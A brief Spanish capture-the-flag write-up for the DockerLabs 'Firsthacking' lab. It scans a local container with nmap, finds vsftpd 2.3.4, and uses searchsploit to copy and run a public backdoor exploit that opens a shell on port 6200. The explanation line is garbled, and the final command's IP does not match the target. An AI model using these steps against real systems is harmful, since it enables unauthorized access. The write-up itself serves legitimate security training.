# **DockerLabs - Firsthacking**
## **Resumen**
* **Dificultad:** Muy facil
* **Tiempo:** ~10 minutos
* **Fecha:** 21/04/26
## Info
| | |
|-------|-------|
| IP | 172.17.0.2 |
| OS | Linux (Docker) |
| Puertos abiertos | 21 (ftp) |
## Enumeracion de puertos
Ejecutamos ```nmap``` con el parametro -sV para que nos de tambien la version.
```
nmap -sV 172.17.0.2
```
| Puerto | Servicio | Version |
|--------|--------|-------|
| 21 | tcp | vsftpd 2.3.4 |
## Busqueda de vulnerabilidades
Ejecutamos ```searchsploit``` con la version del ftp para ver si hay vulnerabilidades conocidas.
```
searchsploit vsftpd 2.3.4
```
<img width="805" height="97" alt="image" src="https://github.com/user-attachments/assets/2b4d5ee0-eb3c-4bda-a795-78708cb4cfaa" />
Vemos que hay una vulnerabilidad de backdoor.
## Explotacion
Este exploit es conocido por poner ) a un usuario y te abre una shell en el puerto **6200/tcp**
Nos copiamos el exploit.
```
searchsploit -m 49757.py
```
Y lo ejecutamos.
```
python3 49757.py 127.17.0.2
```

